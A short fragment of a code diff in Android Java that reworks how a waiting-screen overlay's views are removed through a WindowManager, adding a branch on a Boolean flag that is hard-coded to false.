-            windowManagerRemove.removeView(txtRemoveCounting);
-            windowManagerRemove.removeView(imgRemove);
-            overlayRemoveView = null;
-            isWaitingScreen = false;
+            Boolean alert_status = false;
+            if(alert_status) {
+                windowManagerRemove.removeView(overlayRemoveView);
+                windowManagerRemove.removeView(txtRemoveWaiting);
+                windowManagerRemove.removeView(txtRemoveTitle);
+                windowManagerRemove.removeView(txtRemoveCounting);
+                windowManagerRemove.removeView(imgRemove);
+                overlayRemoveView = null;
+                isWaitingScreen = false;
+            } else {
+                windowManagerRemove.removeView(overlayRemoveView);
+                windowManagerRemove.removeView(imgRemove);
+                windowManagerRemove.removeView(txtRemoveCounting);
+                overlayRemoveView = null;
+                isWaitingScreen = false;
+            }
+
+
         }
     }
 
